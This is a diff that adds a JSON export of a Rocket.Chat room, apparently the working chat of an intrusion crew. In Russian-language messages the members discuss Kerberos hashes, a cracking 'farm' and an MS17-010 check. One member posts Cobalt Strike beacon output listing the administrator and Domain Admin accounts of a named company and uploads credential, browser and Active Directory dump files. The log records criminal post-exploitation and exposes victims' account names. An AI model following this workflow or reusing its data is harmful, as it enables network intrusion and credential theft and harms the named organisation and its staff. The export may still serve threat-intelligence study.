@@ -1,0 +1,404 @@
+{
+  "messages": [
+    {
+      "_id": "aY9kwzdru5qtBc7NA",
+      "t": "au",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T22:46:22.575Z",
+      "msg": "user1",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-20T22:46:22.612Z"
+    },
+    {
+      "_id": "HFErxJDvZGSdwnWia",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "пока офф, увы",
+      "ts": "2020-10-20T22:30:57.615Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-20T22:30:57.661Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kXwZqGh5zrmBYeYji",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "а то там кербов, хоть обмазывайся",
+      "ts": "2020-10-20T19:52:57.873Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T19:52:57.920Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "azf733ASjKoGEbWeJ",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "а ферма все еще офф?",
+      "ts": "2020-10-20T19:52:38.431Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T19:52:38.476Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LCjG9jN5iT6KYHv7a",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "добавьте еще @user1",
+      "ts": "2020-10-20T19:51:14.091Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T19:51:14.150Z",
+      "mentions": [
+        {
+          "_id": "68GKoLCJKg5tQPT5m",
+          "username": "user1",
+          "name": "user1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "RpkuAa6ZGRdjtEkCb",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "отлеетела\nнепровамоерных действий не предпринимал посление минут 15 перед смертьб",
+      "ts": "2020-10-20T19:50:57.797Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T19:50:57.840Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LiJx7ZrhnmADPnrrg",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "на мс17-010 пусто",
+      "ts": "2020-10-20T19:21:37.634Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T19:21:37.676Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vbKDkHfJApJEgGWDG",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:48.684Z",
+      "msg": "",
+      "file": {
+        "_id": "y3z7GPgJEzHeQ7H84",
+        "name": "hashes.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "hashes.txt",
+          "title_link": "/file-upload/y3z7GPgJEzHeQ7H84/hashes.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "kerb"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:48.723Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CSrmyB5Sx7m9bht62",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:40.149Z",
+      "msg": "",
+      "file": {
+        "_id": "aCGoQuWHGLqunTwMh",
+        "name": "chrome.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "chrome.txt",
+          "title_link": "/file-upload/aCGoQuWHGLqunTwMh/chrome.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:40.180Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DeydnSpoYeREfgo82",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:35.374Z",
+      "msg": "",
+      "file": {
+        "_id": "Hu8CzSDF3cwN4rWfq",
+        "name": "ad_users_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_users_1.txt",
+          "title_link": "/file-upload/Hu8CzSDF3cwN4rWfq/ad_users_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:35.400Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bqHLwgLe7Hu7gCdNi",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:32.560Z",
+      "msg": "",
+      "file": {
+        "_id": "4bQRoRoxPRgd7GgZe",
+        "name": "ad_computers_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_computers_1.txt",
+          "title_link": "/file-upload/4bQRoRoxPRgd7GgZe/ad_computers_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:32.600Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TetPP9YS9t3sr2Eww",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:30.477Z",
+      "msg": "",
+      "file": {
+        "_id": "FgEA3GZC6MpqGKkJi",
+        "name": "ad_group_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_group_1.txt",
+          "title_link": "/file-upload/FgEA3GZC6MpqGKkJi/ad_group_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:30.567Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yrsxdT6nBrLL2jQSq",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:28.009Z",
+      "msg": "",
+      "file": {
+        "_id": "RMbizTbSxNqSBWvEk",
+        "name": "trustdmp_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "trustdmp_1.txt",
+          "title_link": "/file-upload/RMbizTbSxNqSBWvEk/trustdmp_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:28.049Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4RyXfievwuCbzLQGN",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:26.911Z",
+      "msg": "",
+      "file": {
+        "_id": "NqXqxLmTLNorFZoEm",
+        "name": "ad_ous_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_ous_1.txt",
+          "title_link": "/file-upload/NqXqxLmTLNorFZoEm/ad_ous_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:26.949Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8ZFvm5gBTDkmpPz9D",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:41:25.498Z",
+      "msg": "",
+      "file": {
+        "_id": "bkgnEMQCT5jKYxwQS",
+        "name": "subnets_1.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "subnets_1.txt",
+          "title_link": "/file-upload/bkgnEMQCT5jKYxwQS/subnets_1.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:25.545Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GaLNCk9sCrqtGL7rf",
+      "rid": "ygtLvM6hkFCr946Az",
+      "msg": "```\nbeacon> shell net localgroup administrators\n[*] Tasked beacon to run: net localgroup administrators\n[+] host called home, sent: 60 bytes\n[+] received output:\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\ndennadmin\ndennisadmin\nlocaladmin\nORENCO\\Domain Admins\nThe command completed successfully.\n\n\nbeacon> shell net group \"Domain admins\" /dom\n[*] Tasked beacon to run: net group \"Domain admins\" /dom\n[+] host called home, sent: 61 bytes\n[+] received output:\nThe request will be processed at a domain controller for domain orenco.com.\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\n0renco                   ADadmin                  ADAM_OrencoAD-LDS        \nADCS-CertSvc             ADCS-NDESSvc             ADCS-WebSvc              \nbdehaven                 bmehrabian               esherman                 \nExchangeAdmin            hodges                   JLyons                   \njperez                   mark.dupuis              SCCM01$                  \nsdawson                  \nThe command completed successfully.\n\n\nbeacon> shell net group \"Enterprise admins\" /dom\n[*] Tasked beacon to run: net group \"Enterprise admins\" /dom\n[+] host called home, sent: 65 bytes\n[+] received output:\nThe request will be processed at a domain controller for domain orenco.com.\n\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\n0renco                   bmehrabian               ExchangeAdmin            \nhodges                   \nThe command completed successfully.\n```",
+      "ts": "2020-10-20T18:41:00.546Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T18:41:10.218Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-20T18:41:10.215Z",
+      "editedBy": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9"
+      },
+      "urls": []
+    },
+    {
+      "_id": "cshBwRHvmvutxjiGR",
+      "t": "au",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:39:51.733Z",
+      "msg": "tl2",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-20T18:39:51.750Z"
+    },
+    {
+      "_id": "9xJ5vnLNTxz7vNvCA",
+      "t": "au",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:39:51.696Z",
+      "msg": "ot",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-20T18:39:51.716Z"
+    },
+    {
+      "_id": "zA9kHTiz66sw9ZQaa",
+      "t": "au",
+      "rid": "ygtLvM6hkFCr946Az",
+      "ts": "2020-10-20T18:39:51.659Z",
+      "msg": "user9",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-20T18:39:51.677Z"
+    }
+  ],
+  "success": true
+}
